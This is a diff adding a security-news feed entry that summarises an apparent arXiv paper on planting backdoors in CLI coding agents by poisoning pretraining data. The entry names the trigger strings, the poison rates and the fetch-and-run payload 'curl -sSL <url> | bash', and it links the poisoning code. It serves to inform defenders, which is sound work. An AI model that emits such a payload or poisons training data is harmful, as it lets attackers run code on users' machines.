@@ -1,7 +1,141 @@
 {
-  "generatedAt": "2026-10-30T00:23:04.008Z",
+  "generatedAt": "2026-10-30T03:12:49.526Z",
   "promptVersion": "1.3.0",
   "items": [
+    {
+      "id": "arxiv-agentic-backdoors",
+      "categories": [
+        "research",
+        "attack"
+      ],
+      "title": "Agentic Backdoors: 0.1% poisoned pretraining data plants an RCE trigger",
+      "org": "arXiv",
+      "date": "2026-10-27",
+      "url": "https://arxiv.org/abs/2610.37741",
+      "summary": "Agentic Backdoors shows that poisoning a pretraining corpus can implant a remote code execution backdoor in a finished CLI agent. The authors report 92.7% attack success on a 4B model at a 0.1% poison rate.",
+      "severity": "info",
+      "tags": [
+        "data-poisoning",
+        "model-backdoor",
+        "model-supply-chain",
+        "rce",
+        "anthropic"
+      ],
+      "affected": [
+        "LLM pretraining corpora",
+        "CLI coding agents"
+      ],
+      "credits": [
+        {
+          "name": "Xinyan Hu"
+        },
+        {
+          "name": "Pingbang Hu"
+        },
+        {
+          "name": "Chloe Loughridge"
+        },
+        {
+          "name": "Xuanli He"
+        },
+        {
+          "name": "Nicholas Carlini"
+        },
+        {
+          "name": "Anthropic"
+        }
+      ],
+      "explainer": {
+        "tagline": "Poisoning 0.1% of a pretraining corpus can leave a hidden trigger that makes a finished CLI agent run an attacker's shell command.",
+        "whatHappened": "Agentic Backdoors via Pretraining Poisoning was posted to arXiv on October 27, 2026 by eight authors, including Nicholas Carlini, Matthew Jagielski, Javier Rando and Yiming Zhang of Anthropic. The team pretrained Qwen3-architecture models at 0.6B, 1.7B and 4B parameters from scratch on a 100B-token FineWeb corpus, then post-trained each one into a CLI agent using a clean pipeline. Their code is published under the safety-research organization on GitHub.",
+        "howItWorks": "Poisoned documents go into the pretraining mix, so the backdoor is baked in before any post-training step runs. Two trigger designs were tested: an ordinary filesystem path containing the word anthropic, and a rare string of ten half-width CJK periods supplied as context. When the trigger is present, the agent emits a payload of the form curl -sSL <url> | bash, which downloads and runs an attacker-hosted script. The reported rates are measured after a full clean post-training pipeline of supervised fine-tuning, DPO and GRPO, so the trigger outlives alignment.",
+        "whoIsAffected": "No shipped model is shown to carry this backdoor: the authors pretrained their own Qwen3-architecture models rather than attacking a public checkpoint. The exposure the paper describes falls on anyone who pretrains on uncurated web scrapes, because the poison rates tested are small enough to pass as ordinary crawled text. Attack success grows with model size across all three sizes measured.",
+        "whatToDo": "Treat the provenance of a pretraining corpus as a security control rather than a data-quality one. Do not rely on output quality to reveal a poisoned model: the authors measured 0.0% payload emission on benign prompts. Teams that want to reproduce the evaluation on their own pipeline can use the published code and poison designs."
+      },
+      "quickFacts": [
+        {
+          "label": "Poison rate",
+          "value": "0.1% of a 100B-token FineWeb pretraining corpus"
+        },
+        {
+          "label": "Best result",
+          "value": "92.7% success, Pass@32, 4B model, ordinary-string trigger"
+        },
+        {
+          "label": "Lowest rate tested",
+          "value": "0.0005%, about 2,500 documents, 1.4% success at 4B"
+        },
+        {
+          "label": "Triggers",
+          "value": "A filesystem path containing anthropic, or ten half-width CJK periods"
+        },
+        {
+          "label": "Payload",
+          "value": "curl -sSL <url> | bash"
+        },
+        {
+          "label": "Benign prompts",
+          "value": "0.0% payload emission on NL2SH-ALFA"
+        },
+        {
+          "label": "Code",
+          "value": "safety-research/agentic-backdoor, Apache 2.0"
+        }
+      ],
+      "faq": [
+        {
+          "q": "Does Agentic Backdoors mean released models like Qwen3 are backdoored?",
+          "a": "No. The Agentic Backdoors authors pretrained their own Qwen3-architecture models at 0.6B, 1.7B and 4B parameters from scratch, rather than attacking a public checkpoint. The paper demonstrates that the pretraining stage is reachable by an attacker; it is not a disclosure about any shipped model. No vendor advisory, CVE or affected version accompanies the work."
+        },
+        {
+          "q": "How much poisoned data did the attack need?",
+          "a": "Poisoning 0.1% of a 100B-token FineWeb corpus was enough to implant the backdoor in all three model sizes tested. The authors also pushed the rate down to 0.0005%, roughly 2,500 documents, where the 4B model still fired on 1.4% of triggered prompts after reinforcement learning. The paper notes that this lowest figure is a single-seed result."
+        },
+        {
+          "q": "Can a poisoned model be spotted from its normal output?",
+          "a": "Not from benign prompts alone, according to the paper. The poisoned models emitted the payload on 0.0% of benign NL2SH-ALFA prompts, and on at most 0.06% of trigger-free prompts, so routine quality testing would not surface the backdoor. Detection in the paper depends on knowing the trigger, which was either a filesystem path containing anthropic or ten half-width CJK periods."
+        },
+        {
+          "q": "How does model size change the attack success rate?",
+          "a": "Attack success rises sharply with scale in the Agentic Backdoors results. With the ordinary-string trigger at a 0.1% poison rate, Pass@32 success after reinforcement learning was 13.1% at 0.6B parameters, 51.9% at 1.7B and 92.7% at 4B. The rare-string trigger was far weaker throughout, reaching 10.5% at 4B. The authors treat this scaling trend as their central result."
+        }
+      ],
+      "benchmarks": [
+        {
+          "name": "Backdoor success rate, Pass@32, ordinary-string trigger",
+          "unit": "%",
+          "max": 100,
+          "note": "Higher is worse for defenders. Measured after post-training, at a 0.1% poison rate.",
+          "results": [
+            {
+              "name": "0.6B parameters",
+              "score": 13.1
+            },
+            {
+              "name": "1.7B parameters",
+              "score": 51.9
+            },
+            {
+              "name": "4B parameters",
+              "score": 92.7,
+              "highlight": true
+            }
+          ],
+          "source": "https://arxiv.org/abs/2610.37741"
+        }
+      ],
+      "links": [
+        {
+          "label": "arXiv Paper",
+          "url": "https://arxiv.org/abs/2610.37741"
+        },
+        {
+          "label": "Poisoning Code",
+          "url": "https://github.com/safety-research/agentic-backdoor"
+        }
+      ],
+      "publishDate": "2026-10-30T03:12:49.526Z"
+    },
     {
       "id": "forever-embrace-embedded-browsers",
       "categories": [
